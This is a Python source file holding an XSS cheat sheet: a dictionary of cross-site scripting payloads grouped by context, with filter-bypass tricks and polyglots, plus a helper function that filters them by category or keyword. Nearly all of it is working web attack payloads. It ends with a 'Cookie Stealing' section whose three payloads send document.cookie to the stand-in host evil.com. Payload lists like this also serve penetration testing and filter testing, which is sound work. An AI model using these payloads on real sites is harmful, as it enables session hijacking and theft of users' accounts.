"""XSS (Cross-Site Scripting) cheat sheet."""

XSS_CHEATSHEET = {
    "title": "XSS (Cross-Site Scripting) Cheat Sheet",
    "categories": {
        "basic_payloads": {
            "title": "Basic XSS Payloads",
            "description": "Simple payloads to test for XSS",
            "payloads": [
                {"payload": "<script>alert(1)</script>", "description": "Classic script tag"},
                {"payload": "<script>alert('XSS')</script>", "description": "Alert with string"},
                {"payload": "<script>alert(document.domain)</script>", "description": "Show domain"},
                {"payload": "<script>alert(document.cookie)</script>", "description": "Show cookies"},
                {"payload": "<img src=x onerror=alert(1)>", "description": "Image error event"},
                {"payload": "<svg onload=alert(1)>", "description": "SVG onload"},
                {"payload": "<body onload=alert(1)>", "description": "Body onload"},
                {"payload": "<input onfocus=alert(1) autofocus>", "description": "Input autofocus"},
                {"payload": "<marquee onstart=alert(1)>", "description": "Marquee onstart"},
                {"payload": "<video src=x onerror=alert(1)>", "description": "Video error"},
            ],
        },

        "attribute_injection": {
            "title": "Attribute Injection",
            "description": "XSS via HTML attribute context",
            "payloads": [
                {"payload": "\" onmouseover=\"alert(1)", "description": "Event in attribute"},
                {"payload": "' onmouseover='alert(1)", "description": "Single quote version"},
                {"payload": "\" onfocus=\"alert(1)\" autofocus=\"", "description": "Autofocus trick"},
                {"payload": "\" onclick=\"alert(1)", "description": "Click event"},
                {"payload": "\"><script>alert(1)</script>", "description": "Break out & script"},
                {"payload": "'><script>alert(1)</script>", "description": "Single quote breakout"},
                {"payload": "><img src=x onerror=alert(1)>", "description": "Break & img tag"},
            ],
        },

        "javascript_context": {
            "title": "JavaScript Context",
            "description": "XSS when injecting into JavaScript code",
            "payloads": [
                {"payload": "';alert(1)//", "description": "Break string & comment"},
                {"payload": "\";alert(1)//", "description": "Double quote version"},
                {"payload": "'-alert(1)-'", "description": "Arithmetic trick"},
                {"payload": "\\';alert(1)//", "description": "Escape backslash"},
                {"payload": "</script><script>alert(1)</script>", "description": "Close & new script"},
                {"payload": "${alert(1)}", "description": "Template literal"},
                {"payload": "{{constructor.constructor('alert(1)')()}}", "description": "Angular/Template"},
            ],
        },

        "url_context": {
            "title": "URL/href Context",
            "description": "XSS in URL attributes",
            "payloads": [
                {"payload": "javascript:alert(1)", "description": "JavaScript protocol"},
                {"payload": "javascript:alert(document.domain)", "description": "JS protocol + domain"},
                {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI"},
                {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "description": "Base64 data URI"},
                {"payload": "//evil.com", "description": "Protocol-relative URL"},
                {"payload": "\\\\evil.com", "description": "Backslash URL"},
            ],
        },

        "filter_bypass": {
            "title": "Filter Bypass",
            "description": "Bypass common XSS filters",
            "payloads": [
                {"payload": "<ScRiPt>alert(1)</ScRiPt>", "description": "Mixed case"},
                {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "description": "Nested tags"},
                {"payload": "<img src=x onerror=alert`1`>", "description": "Template literal"},
                {"payload": "<svg/onload=alert(1)>", "description": "No space needed"},
                {"payload": "<img src=x onerror=alert&#40;1&#41;>", "description": "HTML entities"},
                {"payload": "<img src=x onerror=\\u0061lert(1)>", "description": "Unicode escape"},
                {"payload": "<img src=x onerror=al\\u0065rt(1)>", "description": "Partial unicode"},
                {"payload": "<%00script>alert(1)</script>", "description": "Null byte"},
                {"payload": "<img src=\"x\" onerror=\"alert(1)\">", "description": "Encoded quotes"},
            ],
        },

        "dom_based": {
            "title": "DOM-Based XSS",
            "description": "Payloads for DOM-based XSS",
            "payloads": [
                {"payload": "#<script>alert(1)</script>", "description": "Fragment injection"},
                {"payload": "?search=<script>alert(1)</script>", "description": "Query param"},
                {"payload": "javascript:alert(1)//", "description": "JS in location"},
                {"payload": "<img src=x onerror=eval(location.hash.slice(1))>", "description": "Eval hash"},
            ],
        },

        "event_handlers": {
            "title": "Event Handlers",
            "description": "Various event handlers for XSS",
            "payloads": [
                {"payload": "<img src=x onerror=alert(1)>", "description": "onerror"},
                {"payload": "<body onload=alert(1)>", "description": "onload"},
                {"payload": "<input onfocus=alert(1) autofocus>", "description": "onfocus"},
                {"payload": "<div onmouseover=alert(1)>hover</div>", "description": "onmouseover"},
                {"payload": "<textarea onfocus=alert(1) autofocus>", "description": "textarea focus"},
                {"payload": "<details open ontoggle=alert(1)>", "description": "ontoggle"},
                {"payload": "<audio src=x onerror=alert(1)>", "description": "audio error"},
                {"payload": "<video src=x onerror=alert(1)>", "description": "video error"},
                {"payload": "<object data=x onerror=alert(1)>", "description": "object error"},
                {"payload": "<iframe src=x onload=alert(1)>", "description": "iframe onload"},
            ],
        },

        "polyglots": {
            "title": "XSS Polyglots",
            "description": "Payloads that work in multiple contexts",
            "payloads": [
                {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", "description": "Multi-context polyglot"},
                {"payload": "'\"-->]]>*/--><script>alert(1)</script>", "description": "Context breaker"},
                {"payload": "\"><img src=x onerror=alert(1)>//'\"-->", "description": "Simple polyglot"},
            ],
        },

        "cookie_stealing": {
            "title": "Cookie Stealing",
            "description": "Payloads to exfiltrate cookies",
            "payloads": [
                {"payload": "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", "description": "Image request"},
                {"payload": "<script>fetch('http://evil.com/?c='+document.cookie)</script>", "description": "Fetch API"},
                {"payload": "<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>", "description": "Img src change"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """
    Get XSS cheatsheet.

    Args:
        category: Specific category to return
        filter_keyword: Filter payloads containing keyword

    Returns:
        Cheatsheet dictionary
    """
    if category and category in XSS_CHEATSHEET["categories"]:
        result = {
            "title": XSS_CHEATSHEET["title"],
            "categories": {category: XSS_CHEATSHEET["categories"][category]},
        }
    else:
        result = XSS_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
